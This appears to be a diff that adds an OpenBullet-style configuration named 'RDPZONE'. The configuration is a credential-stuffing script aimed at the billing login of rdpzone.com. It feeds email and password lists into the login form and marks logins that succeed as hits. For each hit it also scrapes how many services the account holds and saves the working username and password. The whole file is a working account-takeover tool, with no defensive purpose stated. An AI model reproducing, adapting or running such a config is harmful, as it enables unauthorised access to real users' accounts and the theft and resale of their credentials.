@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "RDPZONE",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-12T21:18:40.9490858+02:00",
+  "AdditionalInfo": "",
+  "Author": "Shark",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.rdpzone.com/billing/clientarea.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "name=\"token\" value=\"" "\"" -> VAR "Token" 
+
+REQUEST POST "https://www.rdpzone.com/billing/dologin.php" 
+  CONTENT "token=<Token>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Login Details Incorrect. Please try again." 
+
+REQUEST GET "https://www.rdpzone.com/billing/clientarea.php?action=services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<span class=\"badge\">" "</span>" -> CAP "Services" 
+
+FUNCTION Constant "Hits: <USER>:<PASS> Nb Serv:<Services>" -> VAR "CAPTURE" 
+
